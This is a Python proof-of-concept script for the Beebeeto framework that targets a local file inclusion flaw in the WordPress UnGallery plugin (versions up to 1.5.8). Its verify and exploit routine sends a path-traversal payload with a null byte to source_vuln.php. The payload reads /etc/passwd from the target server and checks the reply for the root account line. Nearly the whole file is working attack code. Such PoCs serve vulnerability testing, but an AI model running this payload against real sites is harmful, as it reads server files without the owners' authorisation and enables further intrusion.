#!/usr/bin/env python
# coding=utf-8


"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0040',
            'name': 'WordPress UnGallery plugin <= 1.5.8 /source_vuln.php 本地文件包含漏洞 POC',
            'author': 'Tiny',
            'create_date': '2015-03-01',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['<=1.5.8'],
            'type': 'Local File Inclusion',
            'tag': ['WordPress UnGallery plugin漏洞', '本地文件包含', 'source_vuln.php', 'php'],
            'desc': '漏洞文件：/wp-content/plugins/ungallery/source_vuln.php',
            'references': ['http://www.exploit-db.com/exploits/17704/',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../../../etc/passwd%00'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:x:0:0:root:/root:/bin/bash' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())